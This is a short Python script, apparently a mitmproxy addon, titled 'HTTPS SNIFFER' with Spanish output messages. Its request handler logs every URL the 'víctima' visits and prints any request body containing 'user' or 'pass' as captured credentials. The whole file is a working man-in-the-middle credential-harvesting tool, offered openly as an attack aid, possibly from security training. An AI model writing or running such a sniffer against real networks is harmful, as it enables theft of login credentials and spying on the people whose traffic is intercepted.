import pyfiglet
import sys
import signal
from mitmproxy import http
from urllib.parse import urlparse
from termcolor import colored

ascii_banner = pyfiglet.figlet_format("HTTPS SNIFFER")
print(colored(ascii_banner,'yellow'))

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo del programa...",'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) #ctrl + c

def has_keywords(data, keywords):
    return any(keyword in data for keyword in keywords)

def request(packet):

    url = packet.request.url
    parsed_url = urlparse(url)
    scheme = parsed_url.scheme
    domain = parsed_url.netloc
    path = parsed_url.path

    print(colored(f"\n[+] URL visitada por la v√≠ctima: {scheme}://{domain}{path}",'blue'))

    keywords = ["user", "pass"]
    data = packet.request.get_text()

    if has_keywords(data, keywords):
        print(colored(f"\n[+] Posibles credenciales capturadas:\n{data}\n",'green'))